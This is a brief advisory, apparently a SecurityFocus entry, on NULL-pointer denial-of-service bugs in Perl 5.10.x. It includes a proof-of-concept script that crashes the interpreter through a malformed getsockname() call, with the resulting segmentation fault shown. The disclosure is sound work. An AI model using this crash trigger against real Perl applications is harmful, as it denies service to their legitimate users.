source: http://www.securityfocus.com/bid/47766/info

Perl is prone to multiple denial-of-service vulnerabilities caused by a NULL-pointer dereference.

An attacker can exploit these issues to cause an affected application to crash, denying service to legitimate users.

Perl versions 5.10.x are vulnerable. 

jonathan () blackbox:~/test$ cat poc1.pl
    #!/usr/bin/perl
    $a =
getsockname(9505,4590,"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAA",17792);
    jonathan () blackbox:~/test$ perl poc1.pl
    Segmentation fault (core dumped)
    jonathan () blackbox:~/test$

